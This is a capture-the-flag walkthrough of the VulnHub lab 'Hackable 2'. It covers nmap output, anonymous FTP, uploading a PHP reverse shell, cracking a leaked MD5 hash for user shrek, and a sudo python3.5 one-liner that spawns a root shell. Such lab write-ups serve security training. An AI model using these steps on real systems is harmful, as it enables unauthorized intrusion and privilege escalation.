# [Hackable 2](https://www.vulnhub.com/entry/hackable-ii,711/)

First as always, `nmap`

```
# Nmap 7.92 scan initiated Wed Sep  8 16:13:34 2021 as: nmap -vvv -p 21,22,80 -sCV -oA init 192.168.1.16
Nmap scan report for 192.168.1.16
Host is up, received syn-ack (0.00026s latency).
Scanned at 2021-09-08 16:13:41 +07 for 12s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDz60boCKErUczzfmmR5Oc6QbAGc07BITB58SwFXDJ5DMr35tssApB/DelFd2t1RoL/Y/t3QvuX/EVIxEk88tN88ivWGC5oSY2EmYkRjg/8/0xqBDk+jVPT3iwpWzcUXn0sc0iEKmTDqAD+epIQ2dlE2wMdyq1Ig/V6DUKOIzkK/4vruMsPGhi1NHgrHHl61B4QaRaZyL0/LR+HQEASc6n0YhTS2DpXIC5yap/zIDMYoa6IbMZcmkBYMN/jqoNkyn4IHLf0TO4d8Ls3Zcyp2l3VJ1c46WzVdJhY5NLJdk3xbKKMH0udVyAWGKvd2xrqkjGb0pFu6yxhCKJuTeWVo5XD
|   256 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDjMXU6dtRvMWvpV8yBynjL6dWz7gYImHfo0mJOlFg+EB4vLIon3kRhpYWBlG4e5DFkAbRtmaxUrADxGMd/YvJY=
|   256 f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHYT4M/QfNJmwr3zV6ONY0c8H71gccVuZ1JmLJpjy7C6
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  8 16:13:53 2021 -- 1 IP address (1 host up) scanned in 18.91 seconds
```

Looking at FTP, we're able to log in anonymously and download the file "CALL.html". Checking its contents ...

```html
<html>

<head>
	<title>onion</title>
</head>

<body>
	<h1>GET READY TO RECEIVE A CALL</h1>

</body>

</html>
```

It's telling to be ready to receive a call, whatever that call is. Moving on, we look at the web page on port 80. The source code includes a comment hinting us at `gobuster` and `dirb` so I run `gobuster` on it.

```
/files                (Status: 200) [Size: 935]
```

Navigating to `/files`, we see the previously found "CALL.html" from FTP. Looking back at FTP, we're able to upload files so we upload a PHP reverse shell via FTP and go to said shell on the website to get a reverse shell as `www-data`.

Looking at `/home`, we see `important.txt`.

```
run the script to see the data

/.runme.sh
```

Following the message, we run `.runme.sh`

```sh
www-data@ubuntu:/$ /.runme.sh
/.runme.sh
the secret key
is
trolled
restarting computer in 3 seconds...
restarting computer in 2 seconds...
restarting computer in 1 seconds...
⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:cf4c2232354952690368f1b3dfdfb24d
```

We get what looks like a password hash for the user shrek. Cracking the hash in [crackstation](https://crackstation.net/) gives us the password `onion` which we use for `su shrek` and become the user "shrek".

Checking our privileges with `sudo -l` ...

```sh
shrek@ubuntu:/$ sudo -l
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
```

We're able to run python as root without a password. We can easily get a root shell with this.

```sh
sudo /usr/bin/python3.5 -c "import os;os.system('/bin/bash')"
```

With that, we should be root.
